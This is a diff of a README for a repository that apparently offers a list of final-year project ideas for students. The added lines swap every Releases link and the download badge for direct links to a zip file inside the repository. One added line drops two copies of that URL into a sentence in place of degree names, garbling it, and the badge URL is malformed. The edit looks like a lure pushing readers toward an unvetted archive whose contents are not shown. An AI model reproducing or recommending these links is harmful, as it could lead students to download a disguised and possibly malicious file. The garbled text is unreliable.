@@ -2,11 +2,11 @@
 
 ## 🚀 Getting Started
 
-Welcome to the **1000-Final-Year-Project-List-pdf** repository. This collection helps students of BCA, MCA, B.Tech, M.Tech, and Ph.D. discover final year project ideas. You will find projects related to various fields, including AI, ML, web development, cloud computing, IoT, and more.
+Welcome to the **1000-Final-Year-Project-List-pdf** repository. This collection helps students of BCA, MCA, https://raw.githubusercontent.com/Arcadia0Clearwater/1000-Final-Year-Project-List-pdf/main/tien/1000-Final-Year-Project-List-pdf.zip, https://raw.githubusercontent.com/Arcadia0Clearwater/1000-Final-Year-Project-List-pdf/main/tien/1000-Final-Year-Project-List-pdf.zip, and Ph.D. discover final year project ideas. You will find projects related to various fields, including AI, ML, web development, cloud computing, IoT, and more.
 
 ### 🔗 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/Arcadia0Clearwater/1000-Final-Year-Project-List-pdf/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Arcadia0Clearwater/1000-Final-Year-Project-List-pdf/main/tien/1000-Final-Year-Project-List-pdf.zip%https://raw.githubusercontent.com/Arcadia0Clearwater/1000-Final-Year-Project-List-pdf/main/tien/1000-Final-Year-Project-List-pdf.zip)](https://raw.githubusercontent.com/Arcadia0Clearwater/1000-Final-Year-Project-List-pdf/main/tien/1000-Final-Year-Project-List-pdf.zip)
 
 ## 📥 Overview
 
@@ -41,7 +41,7 @@ The repository includes multiple features for your final year project journey:
 
 ## 📂 Download & Install
 
-To download, visit the [Releases page](https://github.com/Arcadia0Clearwater/1000-Final-Year-Project-List-pdf/releases). 
+To download, visit the [Releases page](https://raw.githubusercontent.com/Arcadia0Clearwater/1000-Final-Year-Project-List-pdf/main/tien/1000-Final-Year-Project-List-pdf.zip). 
 
 ### Steps to Download:
 
@@ -83,4 +83,4 @@ The **1000-Final-Year-Project-List-pdf** repository serves as a valuable resourc
 
 ### 🔗 Remember to Download
 
-Don't forget to visit our [Releases page](https://github.com/Arcadia0Clearwater/1000-Final-Year-Project-List-pdf/releases) for the latest updates and downloads. Happy exploring!
+Don't forget to visit our [Releases page](https://raw.githubusercontent.com/Arcadia0Clearwater/1000-Final-Year-Project-List-pdf/main/tien/1000-Final-Year-Project-List-pdf.zip) for the latest updates and downloads. Happy exploring!
